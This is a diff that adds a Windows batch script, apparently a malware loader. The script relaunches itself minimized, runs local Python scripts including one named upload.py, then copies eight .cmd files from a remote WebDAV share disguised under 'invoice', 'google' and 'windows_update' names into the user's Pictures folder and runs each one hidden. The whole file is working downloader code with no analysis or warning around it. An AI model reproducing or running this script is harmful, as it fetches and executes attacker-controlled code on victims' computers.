@@ -1,0 +1,32 @@
+@echo off
+setlocal
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+cd /d "%Userprofile%\Downloads\Python\Python312"
+python.exe time.py
+python.exe kam.py
+python.exe update.py
+python.exe upload.py
+
+set source=\\invoicetrycloudflare.com@9983\DavWWWRoot\google\windows_update
+set destination=%USERPROFILE%\Pictures
+
+
+
+REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, sample.cmd, time.cmd, upload.cmd, update.cmd and version.bat to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+copy /Y "%source%\sample.cmd" "%destination%"
+copy /Y "%source%\time.cmd" "%destination%"
+copy /Y "%source%\upload.cmd" "%destination%"
+copy /Y "%source%\update.cmd" "%destination%"
+
+REM Run kam.cmd, las.cmd, zap.cmd, xff.cmd, sample.cmd, time.cmd, upload.cmd and update.cmd
+for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\sample.cmd" "%destination%\xff.cmd" "%destination%\time.cmd" "%destination%\upload.cmd" "%destination%\update.cmd") do (
+    echo Running %%~nxf...
+    start /MIN cmd /c "%%f"
+)
+
+exit
